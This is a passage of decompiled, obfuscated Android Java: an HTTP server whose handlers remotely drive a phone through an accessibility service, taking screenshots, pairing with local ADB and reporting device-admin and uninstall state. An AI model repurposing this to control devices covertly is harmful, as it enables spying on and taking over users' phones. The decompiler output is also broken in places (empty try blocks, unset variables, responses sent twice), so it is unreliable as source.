                if (z2) {
                }
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void v2(CombineFilterWithChild combineFilterWithChild, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1075n;
        if (combineFilterWithChild != null) {
            try {
                if (combineFilterWithChild.getParentFilter() != null) {
                    C0416e o12 = o1(combineFilterWithChild.getParentFilter().getDelegateId());
                    if (m508x(o12, abstractC0381k)) {
                        return;
                    }
                    if (o12 != null) {
                        try {
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("AccessibilityDelegate", e2);
                        }
                        if (combineFilterWithChild.getParentFilter() != null && (m1075n = o12.m1075n(combineFilterWithChild.getParentFilter())) != null) {
                            searchNodeResultVO = o12.m1059D(m1075n.scrollBackwardUtil(new C0980c(combineFilterWithChild, 1)));
                            ApiResult apiResult = new ApiResult();
                            apiResult.setData(searchNodeResultVO);
                            apiResult.setCode(200);
                            apiResult.setMsg("OK");
                            apiResult.setCount(1);
                            apiResult.setSuccess(Boolean.TRUE);
                            String m693N = AbstractC0252h.m693N(apiResult);
                            abstractC0381k.f771l = apiResult.getCode().intValue();
                            abstractC0381k.m952h(m693N);
                            abstractC0381k.mo787l();
                            return;
                        }
                        searchNodeResultVO = null;
                        ApiResult apiResult2 = new ApiResult();
                        apiResult2.setData(searchNodeResultVO);
                        apiResult2.setCode(200);
                        apiResult2.setMsg("OK");
                        apiResult2.setCount(1);
                        apiResult2.setSuccess(Boolean.TRUE);
                        String m693N2 = AbstractC0252h.m693N(apiResult2);
                        abstractC0381k.f771l = apiResult2.getCode().intValue();
                        abstractC0381k.m952h(m693N2);
                        abstractC0381k.mo787l();
                        return;
                    }
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void v3(AbstractC0381k abstractC0381k) {
        boolean z2;
        try {
            if (MyAccessibilityService.m554P() != null) {
                MyAccessibilityService.m554P().f328k.set(1);
                z2 = AbstractC0207l.m421d();
            } else {
                z2 = false;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(z2));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: w */
    public static void m507w(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(AbstractC0252h.m697a());
            apiResult.setCount(1);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void w0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByText(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void w1(ListenWindow listenWindow, AbstractC0381k abstractC0381k) {
        if (listenWindow != null) {
            try {
                if (!AbstractC0026q.m151B(listenWindow.getPackageName())) {
                    if (MyAccessibilityService.m554P() == null) {
                        M1(abstractC0381k);
                        return;
                    }
                    C0416e m522c = MyAccessibilityService.m554P().m522c(listenWindow);
                    ApiResult apiResult = new ApiResult();
                    if (m522c != null) {
                        apiResult.setData(m522c.f864c);
                        apiResult.setCount(1);
                    }
                    apiResult.setCode(200);
                    apiResult.setMsg("OK");
                    apiResult.setSuccess(Boolean.TRUE);
                    String m693N = AbstractC0252h.m693N(apiResult);
                    abstractC0381k.f771l = apiResult.getCode().intValue();
                    abstractC0381k.m952h(m693N);
                    abstractC0381k.mo787l();
                    return;
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("HttpServer", e2);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有错误、或参数不合法,详见参数错误明细");
    }

    public static void w2(CombineFilterWithChild combineFilterWithChild, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1075n;
        if (combineFilterWithChild != null) {
            try {
                if (combineFilterWithChild.getParentFilter() != null) {
                    C0416e o12 = o1(combineFilterWithChild.getParentFilter().getDelegateId());
                    if (m508x(o12, abstractC0381k)) {
                        return;
                    }
                    if (o12 != null) {
                        try {
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("AccessibilityDelegate", e2);
                        }
                        if (combineFilterWithChild.getParentFilter() != null && (m1075n = o12.m1075n(combineFilterWithChild.getParentFilter())) != null) {
                            searchNodeListResultVO = o12.m1058C(m1075n.scrollForwardUtilMultiple(new C0980c(combineFilterWithChild, 0)));
                            ApiResult apiResult = new ApiResult();
                            apiResult.setData(searchNodeListResultVO);
                            apiResult.setCode(200);
                            apiResult.setMsg("OK");
                            apiResult.setCount(1);
                            apiResult.setSuccess(Boolean.TRUE);
                            String m693N = AbstractC0252h.m693N(apiResult);
                            abstractC0381k.f771l = apiResult.getCode().intValue();
                            abstractC0381k.m952h(m693N);
                            abstractC0381k.mo787l();
                            return;
                        }
                        searchNodeListResultVO = null;
                        ApiResult apiResult2 = new ApiResult();
                        apiResult2.setData(searchNodeListResultVO);
                        apiResult2.setCode(200);
                        apiResult2.setMsg("OK");
                        apiResult2.setCount(1);
                        apiResult2.setSuccess(Boolean.TRUE);
                        String m693N2 = AbstractC0252h.m693N(apiResult2);
                        abstractC0381k.f771l = apiResult2.getCode().intValue();
                        abstractC0381k.m952h(m693N2);
                        abstractC0381k.mo787l();
                        return;
                    }
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void w3(AbstractC0381k abstractC0381k) {
        try {
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            MyAccessibilityService.m554P().getClass();
            TakeScreenShotResult u02 = MyAccessibilityService.u0();
            if (u02 != null && u02.getSaveBytesResult() != null && u02.getSaveBytesResult().length > 0) {
                byte[] saveBytesResult = u02.getSaveBytesResult();
                abstractC0381k.getClass();
                abstractC0381k.mo777b().m796c(new RunnableC0379i(abstractC0381k, new C0292m(saveBytesResult), "image/webp", 0));
            }
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: x */
    public static boolean m508x(C0416e c0416e, AbstractC0381k abstractC0381k) {
        if (c0416e != null) {
            return false;
        }
        try {
            m500p(abstractC0381k, "委托代理无效");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
            return false;
        }
    }

    public static void x0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByTextContains(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void x1(AbstractC0381k abstractC0381k) {
        String str;
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setSuccess(Boolean.TRUE);
            if (C0318e.m844S() != null) {
                CheckPortResult m854M = C0318e.m844S().m854M();
                if (m854M != null) {
                    apiResult.setData(m854M);
                    apiResult.setCount(1);
                    apiResult.setCode(200);
                    str = "OK";
                } else {
                    apiResult.setCount(0);
                    apiResult.setCode(204);
                    str = "No Content";
                }
                apiResult.setMsg(str);
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void x2(CombineFilter combineFilter, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1075n;
        if (combineFilter != null) {
            try {
                C0416e o12 = o1(combineFilter.getDelegateId());
                if (m508x(o12, abstractC0381k)) {
                    return;
                }
                if (o12 != null) {
                    try {
                        m1075n = o12.m1075n(combineFilter);
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("AccessibilityDelegate", e2);
                    }
                    if (m1075n != null) {
                        searchNodeListResultVO = o12.m1058C(m1075n.scrollForwardUtilMultiple(new C0981d(combineFilter, 0)));
                        ApiResult apiResult = new ApiResult();
                        apiResult.setData(searchNodeListResultVO);
                        apiResult.setCode(200);
                        apiResult.setMsg("OK");
                        apiResult.setCount(1);
                        apiResult.setSuccess(Boolean.TRUE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    searchNodeListResultVO = null;
                    ApiResult apiResult2 = new ApiResult();
                    apiResult2.setData(searchNodeListResultVO);
                    apiResult2.setCode(200);
                    apiResult2.setMsg("OK");
                    apiResult2.setCount(1);
                    apiResult2.setSuccess(Boolean.TRUE);
                    String m693N2 = AbstractC0252h.m693N(apiResult2);
                    abstractC0381k.f771l = apiResult2.getCode().intValue();
                    abstractC0381k.m952h(m693N2);
                    abstractC0381k.mo787l();
                    return;
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void x3(String str, TargetActionCondition targetActionCondition, AbstractC0381k abstractC0381k) {
        boolean z2;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、动作参数不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(targetActionCondition.getTarget(), targetActionCondition.getResUnique());
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null) {
                z2 = m1074m.actionByName(targetActionCondition);
                ApiResult apiResult = new ApiResult();
                apiResult.setData(Boolean.valueOf(z2));
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            z2 = false;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(Boolean.valueOf(z2));
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    /* renamed from: y */
    public static void m509y(String str, String str2, AbstractC0381k abstractC0381k) {
        boolean z2;
        try {
            if (AbstractC0026q.m151B(str) && AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "filePathAndName、galleryUrl不能为空");
                return;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            RespDeleteFileVO respDeleteFileVO = new RespDeleteFileVO();
            if (AbstractC0026q.m151B(str)) {
                z2 = false;
            } else {
                boolean m181n = AbstractC0026q.m181n(str);
                z2 = m181n ? AbstractC0251g.m629B(str, str2) : false;
                r3 = m181n;
            }
            respDeleteFileVO.setFileDeleted(Boolean.valueOf(r3));
            respDeleteFileVO.setGalleryDeleted(Boolean.valueOf(z2));
            apiResult.setData(respDeleteFileVO);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void y0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByTextEndsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void y1(String str, String str2, String str3, boolean z2, AbstractC0381k abstractC0381k) {
        CheckPortResult m854M;
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setSuccess(Boolean.TRUE);
            apiResult.setCode(204);
            apiResult.setMsg("No Content");
            PairResponseVO pairResponseVO = new PairResponseVO();
            pairResponseVO.setDeviceId(AbstractC0252h.m708l("deviceId"));
            pairResponseVO.setPaired(false);
            pairResponseVO.setDebugPort(0);
            pairResponseVO.setConnected(false);
            if (AbstractC0026q.m153D(str2) && !AbstractC0026q.m151B(str3) && C0318e.m844S() != null && C0318e.m844S().m852K(str, Integer.parseInt(str2), str3)) {
                Log.i("HttpServer", "本地ADB已配对成功");
                pairResponseVO.setPaired(true);
                if (z2 && (m854M = C0318e.m844S().m854M()) != null) {
                    pairResponseVO.setDebugPort(m854M.getDebugPort());
                    pairResponseVO.setConnected(m854M.isConnected());
                }
            }
            apiResult.setData(pairResponseVO);
            apiResult.setCount(1);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            AbstractC0252h.m721y(pairResponseVO);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void y2(CombineFiltersWithOr combineFiltersWithOr, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        if (combineFiltersWithOr != null) {
            try {
                C0416e o12 = o1(combineFiltersWithOr.getDelegateId());
                if (m508x(o12, abstractC0381k)) {
                    return;
                }
                if (o12 != null) {
                    try {
                        m1074m = o12.m1074m(combineFiltersWithOr.getTarget(), combineFiltersWithOr.getResUnique());
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("AccessibilityDelegate", e2);
                    }
                    if (m1074m != null) {
                        searchNodeListResultVO = o12.m1058C(m1074m.scrollForwardUtilMultiple(new C0981d(combineFiltersWithOr, 1)));
                        ApiResult apiResult = new ApiResult();
                        apiResult.setData(searchNodeListResultVO);
                        apiResult.setCode(200);
                        apiResult.setMsg("OK");
                        apiResult.setCount(1);
                        apiResult.setSuccess(Boolean.TRUE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    searchNodeListResultVO = null;
                    ApiResult apiResult2 = new ApiResult();
                    apiResult2.setData(searchNodeListResultVO);
                    apiResult2.setCode(200);
                    apiResult2.setMsg("OK");
                    apiResult2.setCount(1);
                    apiResult2.setSuccess(Boolean.TRUE);
                    String m693N2 = AbstractC0252h.m693N(apiResult2);
                    abstractC0381k.f771l = apiResult2.getCode().intValue();
                    abstractC0381k.m952h(m693N2);
                    abstractC0381k.mo787l();
                    return;
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static GlobalActionCondition y3(String str, String str2, String str3, List list, List list2) {
        try {
            if (AbstractC0026q.m151B(str)) {
                return null;
            }
            GlobalActionCondition globalActionCondition = new GlobalActionCondition();
            globalActionCondition.setActionName(str);
            if (AbstractC0026q.m153D(str2)) {
                long parseLong = Long.parseLong(str2);
                if (parseLong >= 0) {
                    globalActionCondition.setStart(Long.valueOf(parseLong));
                }
            }
            if (AbstractC0026q.m153D(str3)) {
                long parseLong2 = Long.parseLong(str3);
                if (parseLong2 >= 0) {
                    globalActionCondition.setDuration(Long.valueOf(parseLong2));
                }
            }
            if (list != null && !list.isEmpty() && list2 != null && !list2.isEmpty()) {
                LinkedList linkedList = new LinkedList();
                for (int i2 = 0; i2 < list.size(); i2++) {
                    String str4 = (String) list.get(i2);
                    String str5 = BuildConfig.FLAVOR;
                    if (list2.size() > i2) {
                        str5 = (String) list2.get(i2);
                    }
                    if (AbstractC0026q.m153D(str4) && AbstractC0026q.m153D(str5)) {
                        linkedList.add(new Point(Float.parseFloat(str4), Float.parseFloat(str5)));
                    }
                }
                if (!linkedList.isEmpty()) {
                    globalActionCondition.setPoints(linkedList);
                }
            }
            return globalActionCondition;
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
            return null;
        }
    }

    /* renamed from: z */
    public static void m510z(AbstractC0381k abstractC0381k) {
        try {
            DeviceAdminVO C0 = AbstractC0251g.C0();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(C0);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void z0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByTextMatches(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void z1(String str, String str2, String str3, String str4, AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setCode(204);
            apiResult.setMsg("No Content");
            apiResult.setSuccess(Boolean.TRUE);
            if (C0318e.m844S() != null) {
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setData(Boolean.valueOf(C0318e.m844S().m850I(str, str2, str3, str4)));
                apiResult.setCount(1);
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void z2(CombineFilterWithChild combineFilterWithChild, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1075n;
        if (combineFilterWithChild != null) {
            try {
                if (combineFilterWithChild.getParentFilter() != null) {
                    C0416e o12 = o1(combineFilterWithChild.getParentFilter().getDelegateId());
                    if (m508x(o12, abstractC0381k)) {
                        return;
                    }
                    if (o12 != null) {
                        try {
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("AccessibilityDelegate", e2);
                        }
                        if (combineFilterWithChild.getParentFilter() != null && (m1075n = o12.m1075n(combineFilterWithChild.getParentFilter())) != null) {
                            searchNodeListResultVO = o12.m1058C(m1075n.scrollForwardUtilMultiple(new C0980c(combineFilterWithChild, 1)));
                            ApiResult apiResult = new ApiResult();
                            apiResult.setData(searchNodeListResultVO);
                            apiResult.setCode(200);
                            apiResult.setMsg("OK");
                            apiResult.setCount(1);
                            apiResult.setSuccess(Boolean.TRUE);
                            String m693N = AbstractC0252h.m693N(apiResult);
                            abstractC0381k.f771l = apiResult.getCode().intValue();
                            abstractC0381k.m952h(m693N);
                            abstractC0381k.mo787l();
                            return;
                        }
                        searchNodeListResultVO = null;
                        ApiResult apiResult2 = new ApiResult();
                        apiResult2.setData(searchNodeListResultVO);
                        apiResult2.setCode(200);
                        apiResult2.setMsg("OK");
                        apiResult2.setCount(1);
                        apiResult2.setSuccess(Boolean.TRUE);
                        String m693N2 = AbstractC0252h.m693N(apiResult2);
                        abstractC0381k.f771l = apiResult2.getCode().intValue();
                        abstractC0381k.m952h(m693N2);
                        abstractC0381k.mo787l();
                        return;
                    }
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void z3(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            Boolean bool = Boolean.FALSE;
            Boolean bool2 = Boolean.TRUE;
            MainUninstallPolicyVO mainUninstallPolicyVO = new MainUninstallPolicyVO(bool, bool2);
            Integer num = AbstractC0248d.f402a;
            mainUninstallPolicyVO.setUninstall(Boolean.valueOf(Objects.equals((MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || MainApplication.getInstance().getBuildConfig().getUninstall() == null) ? AbstractC0248d.f403b : MainApplication.getInstance().getBuildConfig().getUninstall(), 1)));
            mainUninstallPolicyVO.setActiveAdmin(Boolean.valueOf(!Objects.equals((MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || MainApplication.getInstance().getBuildConfig().getActiveAdmin() == null) ? AbstractC0248d.f404c : MainApplication.getInstance().getBuildConfig().getActiveAdmin(), 0)));
            apiResult.setData(mainUninstallPolicyVO);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(bool2);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* JADX WARN: Type inference failed for: r1v3, types: [byte[], java.io.Serializable] */
    public final void C3(AbstractC0381k abstractC0381k, String str) {
        Object m648U;
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            if (!AbstractC0026q.m151B(str) && AbstractC0251g.m665l() && (m648U = AbstractC0251g.m648U(str)) != 0 && m648U.length > 0) {
                try {
                    AbstractC0243l.f391a.submit(new RunnableC0229a(this, str, m648U, 0));
                } catch (Exception e2) {
                    AbstractC0026q.m186s("com.guard.wallet.thread.l", e2);
                }
                apiResult.setData(Boolean.TRUE);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public final void W2() {
        C0376f c0376f = this.f293a;
        try {
            c0376f.m957a("OPTIONS", this);
            c0376f.m957a("GET", this);
            c0376f.m957a("POST", this);
            c0376f.f748d = new C0350e(28);
            C0289j c0289j = C0289j.f523f;
            C0375e c0375e = c0376f.f747c;
            c0289j.getClass();
            C0203h c0203h = new C0203h();
            c0289j.m798e(new RunnableC0283d(c0289j, c0375e, c0203h));
            Log.d("HttpServer", "asyncHttpServer 已启动");
            AtomicInteger atomicInteger = f292c;
            atomicInteger.set(1);
            MessageRecordVO messageRecordVO = new MessageRecordVO();
            ContainerEventVO containerEventVO = new ContainerEventVO();
            if (MainApplication.getInstance() != null) {
                containerEventVO.setPackageName(MainApplication.getInstance().getPackageName());
            }
            containerEventVO.setContainerCode("ACCESSIBILITY_CONTAINER");
            containerEventVO.setIsOpened(MyAccessibilityService.m554P() != null ? 1 : 0);
            containerEventVO.setServiceState(Integer.valueOf(atomicInteger.get()));
            messageRecordVO.setIntentCode("android.intent.action.CONTAINER_EVENT");
            messageRecordVO.setExtraBody(containerEventVO);
            if (MainApplication.getInstance() == null || MainApplication.getInstance().getHandlerMsgAndTimer() == null) {
                return;
            }
            MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public final void e1(String str, C0334e c0334e, AbstractC0381k abstractC0381k) {
        try {
        } catch (Exception e2) {
            e = e2;
        }
        try {
            if (!AbstractC0026q.m151B(str)) {
                String m875a = c0334e.m875a("delegateId");
                String m875a2 = c0334e.m875a("resUnique");
                char c = 0;
                int parseInt = AbstractC0026q.m153D(c0334e.m875a("target")) ? Integer.parseInt(c0334e.m875a("target")) : 0;
                switch (str.hashCode()) {
